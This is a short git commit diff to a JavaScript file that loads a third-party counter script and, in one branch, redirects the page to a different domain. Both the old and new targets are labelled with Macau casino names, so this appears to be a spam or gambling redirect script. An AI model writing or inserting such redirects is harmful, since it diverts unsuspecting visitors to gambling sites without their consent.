9191a0bd1964d80d581ff5d70cdcea65b05ff1de
js999999999 <js-9@outlook.com>
2017-02-24 13:29:15 +0800

    Update tt1.js

--- 2017qq/tt1.js
+++ 2017qq/tt1.js
@@ -7,5 +7,5 @@ document.write ('<script language="javascript" src="http://count4.51yes.com/clic
 }
 else
 {
-window.location.href="http://www.00585.com/#新濠天地-老品牌";
+window.location.href="http://www.48171c.com/#澳门新葡京大型国际娱乐城";
 }
